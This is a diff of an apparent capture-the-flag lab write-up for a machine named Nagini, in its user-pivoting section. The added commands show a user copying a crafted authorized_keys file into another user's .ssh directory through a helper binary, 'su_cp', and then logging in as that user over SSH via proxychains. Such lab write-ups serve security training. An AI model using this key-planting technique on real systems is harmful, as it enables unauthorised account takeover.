@@ -1667,17 +1667,26 @@ snape
 snape@Nagini:~$ 
 ```
 user pivoting 
+
 ```bash
-❯ ./install.sh
+snape@Nagini:/var/www/html/joomla$ cd /home/hermoine/
+snape@Nagini:/home/hermoine$ ls
+bin  horcrux2.txt
+snape@Nagini:/home/hermoine$ cd bin/
+snape@Nagini:/home/hermoine/bin$ ls
+su_cp
 ```
 
 a
 ```bash
-❯ ./install.sh
+snape@Nagini:/home/hermoine/bin$ nano /tmp/authorized_keys
+snape@Nagini:/home/hermoine/bin$ ./su_cp /tmp/authorized_keys /home/hermoine/.ssh/authorized_keys 
 ```
 
 ```bash
-❯ ./install.sh
+❯ proxychains ssh hermione@10.10.0.137
+hermione@Nagini:~$ whoami
+hermione
 ```
 a
 ```bash
